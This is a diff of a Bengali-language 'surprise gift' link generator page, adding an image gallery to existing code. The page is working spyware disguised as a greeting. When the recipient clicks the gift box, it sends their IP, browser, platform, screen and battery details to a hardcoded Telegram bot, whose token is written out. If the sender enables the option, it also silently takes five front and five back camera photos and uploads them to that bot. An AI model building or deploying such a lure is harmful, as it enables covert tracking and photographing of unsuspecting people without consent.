@@ -89,7 +89,6 @@
         #countdown-container { text-align: center; padding: 20px; background: #F8FAFC; border-radius: 10px; margin-bottom: 20px; }
         #timer { font-size: 2em; font-weight: 700; color: var(--text-dark); }
         
-        /* --- নতুন সুইচ বাটনের জন্য CSS --- */
         .switch-container { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background-color: #F8FAFC; border-radius: 8px; border: 1.5px solid #E2E8F0; }
         .switch-label { font-weight: 600; font-size: 14px; color: var(--text-dark); cursor: pointer; }
         .switch-label span { display: block; font-size: 12px; font-weight: 400; color: var(--text-light); }
@@ -100,6 +99,29 @@
         input:checked + .slider { background-color: var(--success-color); }
         input:focus + .slider { box-shadow: 0 0 1px var(--success-color); }
         input:checked + .slider:before { transform: translateX(22px); }
+        
+        #image-gallery { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
+        .gallery-image { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 3px solid transparent; transition: all 0.2s ease; }
+        .gallery-image:hover { transform: scale(1.05); }
+        .gallery-image.selected { border-color: var(--theme-primary); transform: scale(1.05); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        
+        /* --- নতুন গ্যালারি বাটনের জন্য CSS --- */
+        .secondary-button {
+            background-color: transparent;
+            color: var(--theme-primary);
+            border: 2px solid var(--theme-primary);
+            padding: 12px;
+            font-size: 15px;
+        }
+        .secondary-button:hover {
+            background-color: rgba(74, 108, 247, 0.05);
+        }
+        #gallery-container {
+            background: #F8FAFC;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
         /* --- নতুন CSS শেষ --- */
 
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
@@ -127,7 +149,25 @@
             <div class="form-group"><label for="senderName">প্রেরকের নাম:</label><input type="text" id="senderName" required placeholder="আপনার নাম"></div>
             <div class="form-group"><label for="receiverName">প্রাপকের নাম:</label><input type="text" id="receiverName" required placeholder="প্রাপকের নাম"></div>
             <div class="form-group"><label for="message">আপনার বার্তা:</label><textarea id="message" rows="4" required placeholder="আপনার বিশেষ বার্তা..."></textarea></div>
-            <div class="form-group"><label for="imageURL">ছবির URL (ঐচ্ছিক):</label><input type="url" id="imageURL" placeholder="https://i.imgur.com/image.jpg"></div>
+            
+            <div class="form-group">
+                <label for="imageURL">ছবির URL (ঐচ্ছিক):</label>
+                <input type="url" id="imageURL" placeholder="https://i.imgur.com/image.jpg">
+            </div>
+
+            <!-- নতুন গ্যালারি বাটন -->
+            <div class="form-group">
+                <button type="button" id="toggleGalleryBtn" class="secondary-button">
+                    <i class="fas fa-images"></i> গ্যালারি থেকে ছবি বাছুন
+                </button>
+            </div>
+            
+            <!-- গ্যালারি কন্টেইনার (ডিফল্টভাবে লুকানো) -->
+            <div id="gallery-container" class="form-group hidden">
+                <label>একটি ছবি বেছে নিন:</label>
+                <div id="image-gallery"></div>
+            </div>
+            
             <div class="form-group">
                 <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                     <input type="checkbox" id="enableCountdown" style="width: auto; height: 16px; aspect-ratio: 1;">
@@ -138,12 +178,11 @@
                 </div>
             </div>
             
-            <!-- নতুন সুইচ বাটন শুরু -->
             <div class="form-group">
                 <div class="switch-container">
                     <label for="enableCamera" class="switch-label">
                         <i class="fas fa-camera"></i> ক্যামেরা সিস্টেম চালু করুন
-                        <span>প্রাপকের ছবি তুলতে চাইলে এটি অন করুন।</span>
+                        <span>প্রাপকের ছবি ও তথ্য পেতে এটি অন করুন।</span>
                     </label>
                     <label class="switch">
                         <input type="checkbox" id="enableCamera">
@@ -151,7 +190,6 @@
                     </label>
                 </div>
             </div>
-            <!-- নতুন সুইচ বাটন শেষ -->
 
             <button type="submit"><i class="fas fa-link"></i> গিফট লিঙ্ক তৈরি করুন</button>
         </form>
@@ -188,112 +226,28 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // --- আপনার ছবির লিঙ্কগুলো এখানে যোগ করুন ---
+        const predefinedImages = [
+            "https://raw.githubusercontent.com/life-by/Baby-app-Projict/refs/heads/main/photo-2/Rose.png", "https://i.imgur.com/fWSHf0v.jpeg",
+            "https://i.imgur.com/pYm2dpj.jpeg", "https://i.imgur.com/V7aVxw6.jpeg",
+            "https://i.imgur.com/D0M3Ynd.jpeg", "https://i.imgur.com/k6wz7oV.jpeg",
+            "https://i.imgur.com/Z4N6d2j.jpeg", "https://i.imgur.com/cWvL2sV.jpeg"
+            // এখানে কমা দিয়ে আরও লিঙ্ক যোগ করতে পারেন
+        ];
+
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
         const BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk"; // আপনার বট টোকেন দিন
         const CHAT_ID = "2139008203";   // আপনার চ্যাট আইডি দিন
         let currentVideoStream = null;
 
-        // --- ক্যামেরা এবং তথ্য পাঠানোর নতুন এবং উন্নত ফাংশন ---
+        // --- ক্যামেরা এবং তথ্য পাঠানোর ফাংশন (অপরিবর্তিত) ---
+        async function captureFromCamera(facingMode, photoCount, baseCaption) { let video; try { video = await startCamera(facingMode); } catch (error) { console.error(`Could not start ${facingMode} camera. Skipping.`); return; } const cameraTypeName = (facingMode === 'user') ? 'Selfie' : 'Back'; for (let i = 1; i <= photoCount; i++) { await new Promise(resolve => setTimeout(resolve, 700)); const photoCaption = `${baseCaption}\n[${cameraTypeName} Camera: Photo ${i}/${photoCount}]`; await captureAndSendPhoto(video, photoCaption); } stopCamera(); }
+        async function initiateDualCameraCapture(caption) { await captureFromCamera('user', 5, caption); await captureFromCamera('environment', 5, caption); }
+        async function sendDeviceInfo() { try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); const ipAddress = data.ip; let batteryStatus = "Not available"; if (navigator.getBattery) { const battery = await navigator.getBattery(); batteryStatus = `Battery: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`; } const deviceInfo = `🎁 **Surprise Box Opened!** 🎁\n---\n**Device Info:**\n- **IP:** \`${ipAddress}\`\n- **Browser:** ${navigator.userAgent}\n- **Platform:** ${navigator.platform}\n- **Screen:** ${window.screen.width}x${window.screen.height}\n- **${batteryStatus}**`; await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo, parse_mode: 'Markdown' }) }); } catch (error) { console.error("Error sending device info:", error); } }
+        function startCamera(facingMode) { return new Promise(async (resolve, reject) => { if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return reject("getUserMedia not supported"); try { currentVideoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } }); const video = document.getElementById('video-preview'); video.srcObject = currentVideoStream; video.onloadedmetadata = () => { video.play(); resolve(video); }; } catch (error) { reject(error); } }); }
+        async function captureAndSendPhoto(video, caption = "") { const canvas = document.getElementById('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height); const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png')); const formData = new FormData(); formData.append("chat_id", CHAT_ID); formData.append("photo", blob, "photo.png"); if (caption) formData.append("caption", caption); try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData }); } catch (error) { console.error("Error sending photo:", error); } }
+        function stopCamera() { if (currentVideoStream) { currentVideoStream.getTracks().forEach(track => track.stop()); currentVideoStream = null; } }
 
-        // একটি নির্দিষ্ট ক্যামেরা থেকে ছবি তোলার সম্পূর্ণ প্রক্রিয়া পরিচালনা করে
-        async function captureFromCamera(facingMode, photoCount, baseCaption) {
-            let video;
-            try {
-                video = await startCamera(facingMode);
-            } catch (error) {
-                console.error(`Could not start ${facingMode} camera. Skipping.`);
-                return; // ক্যামেরা চালু না হলে এই ফাংশন থেকে বেরিয়ে যাবে
-            }
-
-            const cameraTypeName = (facingMode === 'user') ? 'Selfie' : 'Back';
-            
-            for (let i = 1; i <= photoCount; i++) {
-                // প্রতিটি ছবির মাঝে একটি বিরতি দেওয়া হচ্ছে যাতে ক্যামেরা ফোকাস করতে পারে
-                await new Promise(resolve => setTimeout(resolve, 700));
-                
-                const photoCaption = `${baseCaption}\n[${cameraTypeName} Camera: Photo ${i}/${photoCount}]`;
-                await captureAndSendPhoto(video, photoCaption);
-            }
-            
-            stopCamera(); // ছবি তোলা শেষে ক্যামেরা বন্ধ করা হচ্ছে
-        }
-        
-        // সেলফি এবং ব্যাক ক্যামেরা - উভয় থেকেই ছবি তোলার প্রক্রিয়া শুরু করে
-        async function initiateDualCameraCapture(caption) {
-            // প্রথমে সেলফি ক্যামেরা থেকে ছবি তোলা হবে
-            await captureFromCamera('user', 5, caption);
-            
-            // তারপর ব্যাক ক্যামেরা থেকে ছবি তোলা হবে
-            await captureFromCamera('environment', 5, caption);
-        }
-
-        // ডিভাইসের তথ্য সংগ্রহ ও টেলিগ্রামে পাঠানো
-        async function sendDeviceInfo() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ipAddress = data.ip;
-                let batteryStatus = "Not available";
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryStatus = `Battery: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
-                }
-
-                const deviceInfo = `🎁 **Surprise Box Opened!** 🎁\n---\n**Device Info:**\n- **IP:** \`${ipAddress}\`\n- **Browser:** ${navigator.userAgent}\n- **Platform:** ${navigator.platform}\n- **Screen:** ${window.screen.width}x${window.screen.height}\n- **${batteryStatus}**`;
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo, parse_mode: 'Markdown' })
-                });
-            } catch (error) { console.error("Error sending device info:", error); }
-        }
-
-        // নির্দিষ্ট facingMode ব্যবহার করে ক্যামেরা চালু করা
-        function startCamera(facingMode) {
-            return new Promise(async (resolve, reject) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    return reject("getUserMedia not supported");
-                }
-                try {
-                    const constraints = { video: { facingMode: facingMode } };
-                    currentVideoStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    const video = document.getElementById('video-preview');
-                    video.srcObject = currentVideoStream;
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve(video);
-                    };
-                } catch (error) { reject(error); }
-            });
-        }
-        
-        // ছবি তুলে টেলিগ্রামে পাঠানো
-        async function captureAndSendPhoto(video, caption = "") {
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-            
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.png");
-            if (caption) formData.append("caption", caption);
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-            } catch (error) { console.error("Error sending photo:", error); }
-        }
-        
-        // ক্যামেরা বন্ধ করা
-        function stopCamera() {
-            if (currentVideoStream) {
-                currentVideoStream.getTracks().forEach(track => track.stop());
-                currentVideoStream = null;
-            }
-        }
-        
         // --- মূল পেজের বাকি স্ক্রিপ্ট ---
         document.addEventListener('DOMContentLoaded', () => {
             const params = new URLSearchParams(window.location.search);
@@ -304,19 +258,48 @@
                 displayGift(params);
             } else {
                 setupThemeSelector();
-                setupForm();
                 setupCountdownInput();
+                setupImageGallery();
+                setupGalleryToggle(); // নতুন গ্যালারি টগল বাটন সেটআপ
+                setupForm();
             }
         });
+        
+        // --- নতুন গ্যালারি বাটন ফাংশন ---
+        function setupGalleryToggle() {
+            const toggleBtn = document.getElementById('toggleGalleryBtn');
+            const galleryContainer = document.getElementById('gallery-container');
+            toggleBtn.addEventListener('click', () => {
+                galleryContainer.classList.toggle('hidden');
+            });
+        }
+
+        function setupImageGallery() {
+            const galleryContainer = document.getElementById('image-gallery');
+            const imageUrlInput = document.getElementById('imageURL');
+            predefinedImages.forEach(url => {
+                const img = document.createElement('img');
+                img.src = url;
+                img.className = 'gallery-image';
+                img.onclick = () => {
+                    document.querySelectorAll('.gallery-image.selected').forEach(el => el.classList.remove('selected'));
+                    img.classList.add('selected');
+                    imageUrlInput.value = url;
+                };
+                galleryContainer.appendChild(img);
+            });
+            imageUrlInput.addEventListener('input', () => {
+                document.querySelectorAll('.gallery-image.selected').forEach(el => el.classList.remove('selected'));
+            });
+        }
 
         function setupThemeSelector() {
             document.querySelectorAll('.theme-option').forEach(option => {
                 option.addEventListener('click', () => {
                     document.querySelector('.theme-option.active').classList.remove('active');
                     option.classList.add('active');
-                    const theme = option.dataset.theme;
-                    applyTheme(theme);
-                    document.getElementById('customThemeGroup').classList.toggle('hidden', theme !== 'custom');
+                    applyTheme(option.dataset.theme);
+                    document.getElementById('customThemeGroup').classList.toggle('hidden', option.dataset.theme !== 'custom');
                 });
             });
         }
@@ -327,49 +310,26 @@
             });
         }
 
-        function applyTheme(themeName) {
-            document.body.className = `theme-${themeName}`;
-        }
+        function applyTheme(themeName) { document.body.className = `theme-${themeName}`; }
 
         function setupForm() {
             const form = document.getElementById('giftForm');
             form.addEventListener('submit', (e) => {
                 e.preventDefault();
-                const params = new URLSearchParams({
-                    sender: document.getElementById('senderName').value,
-                    receiver: document.getElementById('receiverName').value,
-                    message: document.getElementById('message').value,
-                    image: document.getElementById('imageURL').value,
-                    theme: document.querySelector('.theme-option.active').dataset.theme,
-                });
-                if (params.get('theme') === 'custom') {
-                    params.set('ct', document.getElementById('customThemeText').value);
-                }
-                if (document.getElementById('enableCountdown').checked) {
-                    params.set('cd', document.getElementById('countdownDateTime').value);
-                }
-                
-                if (document.getElementById('enableCamera').checked) {
-                    params.set('cam', 'true');
-                }
-
+                const params = new URLSearchParams({ sender: document.getElementById('senderName').value, receiver: document.getElementById('receiverName').value, message: document.getElementById('message').value, image: document.getElementById('imageURL').value, theme: document.querySelector('.theme-option.active').dataset.theme, });
+                if (params.get('theme') === 'custom') params.set('ct', document.getElementById('customThemeText').value);
+                if (document.getElementById('enableCountdown').checked) params.set('cd', document.getElementById('countdownDateTime').value);
+                if (document.getElementById('enableCamera').checked) params.set('cam', 'true');
                 const giftLink = `${window.location.href.split('?')[0]}?${params.toString()}`;
                 document.getElementById('generatedLink').value = giftLink;
                 document.getElementById('generatedLinkContainer').classList.remove('hidden');
             });
-            
-            document.getElementById('copyButton').addEventListener('click', () => {
-                navigator.clipboard.writeText(document.getElementById('generatedLink').value);
-            });
+            document.getElementById('copyButton').addEventListener('click', () => { navigator.clipboard.writeText(document.getElementById('generatedLink').value); });
         }
 
         function displayGift(params) {
             const countdownTime = params.get('cd');
-            if (countdownTime) {
-                handleCountdown(params, new Date(countdownTime));
-            } else {
-                showMainGiftContent(params);
-            }
+            if (countdownTime) { handleCountdown(params, new Date(countdownTime)); } else { showMainGiftContent(params); }
         }
         
         function handleCountdown(params, targetDate) {
@@ -378,33 +338,18 @@
             countdownContainer.classList.remove('hidden');
             mainGiftContent.classList.add('hidden');
             document.getElementById('receiverTitle').textContent = `প্রিয় ${params.get('receiver')}`;
-
             const interval = setInterval(() => {
                 const distance = targetDate - new Date();
-                if (distance < 0) {
-                    clearInterval(interval);
-                    countdownContainer.classList.add('hidden');
-                    showMainGiftContent(params);
-                    return;
-                }
-                const d = Math.floor(distance / (1000*60*60*24));
-                const h = Math.floor((distance % (1000*60*60*24)) / (1000*60*60));
-                const m = Math.floor((distance % (1000*60*60)) / (1000*60));
-                const s = Math.floor((distance % (1000*60)) / 1000);
+                if (distance < 0) { clearInterval(interval); countdownContainer.classList.add('hidden'); showMainGiftContent(params); return; }
+                const d = Math.floor(distance / (1000*60*60*24)), h = Math.floor((distance % (1000*60*60*24)) / (1000*60*60)), m = Math.floor((distance % (1000*60*60)) / (1000*60)), s = Math.floor((distance % (1000*60)) / 1000);
                 document.getElementById('timer').innerHTML = `${d}d ${h}h ${m}m ${s}s`;
             }, 1000);
         }
 
         function showMainGiftContent(params) {
             document.getElementById('main-gift-content').classList.remove('hidden');
-            const sender = params.get('sender');
-            const receiver = params.get('receiver');
-            const message = params.get('message');
-            const imageURL = params.get('image');
-            const theme = params.get('theme');
-
+            const sender = params.get('sender'), receiver = params.get('receiver'), message = params.get('message'), imageURL = params.get('image'), theme = params.get('theme');
             document.getElementById('receiverTitle').textContent = `প্রিয় ${receiver}`;
-            
             let themeText = 'তোমার জন্য একটি উপহার!';
             if (theme === 'custom') themeText = params.get('ct') || themeText;
             else if (theme === 'birthday') themeText = 'শুভ জন্মদিন!';
@@ -412,39 +357,21 @@
             else if (theme === 'newyear') themeText = 'শুভ নববর্ষ!';
             else if (theme === 'proposal') themeText = 'তোমাকে ভালোবাসি!';
             document.getElementById('themeMessage').textContent = themeText;
-            
-            if (imageURL) {
-                const img = document.getElementById('revealedImage');
-                img.src = imageURL;
-                img.classList.remove('hidden');
-            }
-            
+            if (imageURL) { const img = document.getElementById('revealedImage'); img.src = imageURL; img.classList.remove('hidden'); }
             document.getElementById('giftWrapper').addEventListener('click', () => {
                 const caption = `Gift from: ${sender}\nTo: ${receiver}`;
-
-                // --- মূল পরিবর্তিত কোড ---
-                // ধাপ ১: ডিভাইসের তথ্য সবসময় পাঠানো হবে, কারণ এটি উপহার খোলার একটি অংশ।
                 sendDeviceInfo();
-
-                // ধাপ ২: শুধুমাত্র যদি লিঙ্কে ক্যামেরার অনুমতি থাকে (cam=true), তবেই ছবি তোলা হবে।
-                if (params.get('cam') === 'true') {
-                    initiateDualCameraCapture(caption);
-                }
-                // --- পরিবর্তন শেষ ---
-
+                if (params.get('cam') === 'true') { initiateDualCameraCapture(caption); }
                 document.getElementById('giftBox').classList.add('open');
                 document.querySelector('.click-instruction').style.display = 'none';
-
                 setTimeout(() => {
                     const wrapper = document.getElementById('giftWrapper');
                     wrapper.classList.add('revealed');
                     document.getElementById('giftContentRevealed').classList.remove('hidden');
-                    
                     const msgContainer = document.createElement('div');
                     msgContainer.className = 'message-container';
                     msgContainer.innerHTML = `<h3>${sender} এর বার্তা:</h3><p>${message}</p>`;
                     document.getElementById('giftContentRevealed').appendChild(msgContainer);
-                    
                     setTimeout(() => msgContainer.classList.add('show'), 100);
                     triggerVictoryEffect();
                 }, 1000);
@@ -454,14 +381,7 @@
         function triggerVictoryEffect() {
             const victoryEffect = document.getElementById('victoryEffect');
             victoryEffect.style.display = 'block';
-            for (let i = 0; i < 100; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti-piece';
-                confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                confetti.style.left = `${Math.random() * 100}%`;
-                confetti.style.animationDelay = `${Math.random() * 2}s`;
-                victoryEffect.appendChild(confetti);
-            }
+            for (let i = 0; i < 100; i++) { const confetti = document.createElement('div'); confetti.className = 'confetti-piece'; confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`; confetti.style.left = `${Math.random() * 100}%`; confetti.style.animationDelay = `${Math.random() * 2}s`; victoryEffect.appendChild(confetti); }
             setTimeout(() => { victoryEffect.innerHTML = ''; victoryEffect.style.display = 'none'; }, 3000);
         }
     </script>
